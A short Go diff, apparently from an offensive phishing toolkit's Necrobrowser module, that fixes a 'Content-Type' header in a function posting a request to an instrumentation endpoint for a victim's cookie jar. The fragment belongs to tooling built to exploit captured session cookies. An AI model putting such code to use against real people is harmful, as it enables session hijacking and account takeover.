@@ -232,7 +232,7 @@ func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCoo
 	module.Info("instrumenting %s", tui.Bold(tui.Red(victimID)))
 	client := resty.New()
 	resp, err := client.R().
-		SetHeader("Content-LandingType", "application/json").
+		SetHeader("Content-Type", "application/json").
 		SetBody(newRequest).
 		Post(module.Endpoint)
 
